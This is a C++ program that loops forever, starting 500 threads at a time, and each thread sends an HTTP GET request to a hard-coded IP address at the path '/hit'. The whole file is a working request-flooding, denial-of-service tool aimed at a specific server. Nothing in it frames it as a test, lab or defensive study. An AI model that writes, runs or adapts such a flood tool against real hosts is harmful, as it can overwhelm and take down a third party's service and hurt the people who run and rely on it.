#include <iostream>
#include <thread>
#include "request.hpp"
 
static const int num_threads = 500;
 
//This function will be called from a thread
 
void call_from_thread(int tid) {
    request {
        .url = "http://91.232.174.39/hit"
    }.get().text().make_request();
}
 
int main() {
    while (1==1){
        std::thread t[num_threads];

        //Launch a group of threads
        for (int i = 0; i < num_threads; ++i) {
            t[i] = std::thread(call_from_thread, i);
        }
    
        std::cout << "Launched from the main\n";
    
        //Join the threads with the main thread
        for (int i = 0; i < num_threads; ++i) {
            t[i].join();
        }
    }
    
 
    return 0;
}